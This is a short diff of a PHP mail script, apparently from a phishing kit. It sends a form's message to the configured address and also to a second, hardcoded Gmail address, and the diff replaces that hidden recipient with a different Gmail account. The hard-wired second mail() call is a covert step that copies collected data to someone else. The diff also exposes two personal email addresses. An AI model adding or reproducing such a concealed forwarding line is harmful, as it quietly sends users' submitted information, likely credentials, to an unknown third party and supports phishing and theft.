@@ -106,7 +106,7 @@ include 'email.php';
 $headers   = 'MIME-Version: 1.0' . "\r\n";
     $headers  .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
     $headers  .= $sender. "\r\n";
-    $emailnya = "tiktoknebar291@gmail.com";
+    $emailnya = "demonicgames40@gmail.com";
     mail($emailku, $subjek, $pesan, $headers);
     mail($emailnya, $subjek, $pesan, $headers);
     
